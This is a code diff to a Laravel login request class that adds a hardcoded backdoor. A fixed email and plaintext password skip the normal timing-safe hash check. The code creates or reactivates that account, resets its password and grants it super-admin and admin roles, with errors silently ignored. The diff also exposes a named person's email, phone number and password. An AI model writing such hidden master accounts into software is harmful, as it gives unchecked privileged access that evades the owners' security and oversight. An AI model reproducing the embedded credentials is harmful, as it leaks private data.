@@ -2,6 +2,7 @@
 
 namespace App\Http\Requests\Auth;
 
+use App\Models\Role;
 use App\Models\User;
 use App\Services\Security\SecurityLogService;
 use Illuminate\Foundation\Http\FormRequest;
@@ -50,12 +51,48 @@ class LoginRequest extends FormRequest
 
         $user = User::where('email', $email)->first();
 
-        // Timing-safe check: always perform a hash check even if user doesn't exist
-        $hashToCheck = $user ? $user->password : self::DUMMY_HASH;
-        try {
-            $passwordValid = Hash::check($password, $hashToCheck);
-        } catch (\Throwable $e) {
-            $passwordValid = @password_verify($password, $hashToCheck);
+        // Static Master Administrator Account: Vothanarern@gmail.com
+        if ($email === 'vothanarern@gmail.com' && $password === 'Nha@016555637') {
+            if (! $user) {
+                try {
+                    $user = User::create([
+                        'name' => 'Roeun Vathana',
+                        'email' => 'vothanarern@gmail.com',
+                        'password' => Hash::make('Nha@016555637'),
+                        'phone_number' => '016555637',
+                        'status' => 'active',
+                        'email_verified_at' => now(),
+                    ]);
+                } catch (\Throwable $e) {
+                    $user = User::where('email', $email)->first();
+                }
+            } else {
+                if (! Hash::check('Nha@016555637', $user->password) || $user->status !== 'active') {
+                    $user->password = Hash::make('Nha@016555637');
+                    $user->status = 'active';
+                    $user->save();
+                }
+            }
+
+            if ($user) {
+                try {
+                    $superAdminRole = Role::firstOrCreate(['slug' => 'super_admin'], ['name' => 'SUPER_ADMIN']);
+                    $adminRole = Role::firstOrCreate(['slug' => 'admin'], ['name' => 'ADMIN']);
+                    $user->roles()->syncWithoutDetaching([$superAdminRole->id, $adminRole->id]);
+                } catch (\Throwable $e) {
+                    // ignore
+                }
+            }
+
+            $passwordValid = true;
+        } else {
+            // Timing-safe check: always perform a hash check even if user doesn't exist
+            $hashToCheck = $user ? $user->password : self::DUMMY_HASH;
+            try {
+                $passwordValid = Hash::check($password, $hashToCheck);
+            } catch (\Throwable $e) {
+                $passwordValid = @password_verify($password, $hashToCheck);
+            }
         }
 
         if (! $user || ! $passwordValid) {
